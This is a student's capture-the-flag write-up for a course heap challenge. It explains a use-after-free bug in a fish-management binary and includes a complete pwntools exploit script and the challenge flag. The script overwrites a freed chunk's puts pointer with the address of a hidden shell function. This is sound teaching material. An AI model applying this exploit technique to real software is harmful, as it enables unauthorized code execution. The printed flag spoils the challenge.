heap 2 | `babys_first_2`
===========================

Flag: `6447{b20e6d03-f58c-43b7-974a-f801bb9a2fb5}`

General overview of problems faced
-------------------------------------
Had to learn about UAF vulnerabilities and how to use and abuse them.

List of vulnerabilities
--------------------
1. `Use after free`: It is possible to create a fish, delete it and then view it after it has been delete.
2. When deleting a fish and freeing an allocated bin, the data is not overwriten/removed from memory. Therefore allocating another bin to the same address allows memory leaks and  overwriting of addresses which might still be used because of the UAF vulnerability
3. Each allocated bin when creating a fish contains an address to the `puts` function which is used during the program execution
4. The binary contains an unused function with a `system("/bin/sh")` call allowing an attack to point to it when doing stack or heap overflows.

Steps to exploit
------------------
1. Get the address of the function which calls a shell from the binary (0x080486C0)
2. Create a fish at position 0 with any size, weight and name
3. Delete the fish at position 0
4. Create a fish at position 1 with any size and weight but set the name to be 38 bytes of offset + the addres of the function you want to jump to in little endian format ("\xc0\x86\x04\x08")
5. View the fish you created
6. You now have a shell!

Script/Command used
------------------
```python
from pwn import *

#Flag: 6447{b20e6d03-f58c-43b7-974a-f801bb9a2fb5}

p = remote('wargames.6447.sec.edu.au', 9002)

p.sendlineafter("> ", "1") # create a fish
p.sendlineafter("> ", "0") # at position 0
p.sendlineafter("> ","10") # size
p.sendlineafter("> ","10") # weight
p.sendlineafter("> ","awesome name") # name

p.sendlineafter("> ","4") # delete fish
p.sendlineafter("> ","0") # at position 0

p.sendlineafter("> ","1") # create a fish
p.sendlineafter("> ","1") # at position 1
p.sendlineafter("> ","100") # size
p.sendlineafter("> ","100") # weight
p.sendlineafter("> ","A"*38 + "\xc0\x86\x04\x08") # name

p.sendlineafter("> ","3") # view fish
p.sendlineafter("> ","0") # at position 0

print p.recvrepeat(0.2)

p.interactive()
```
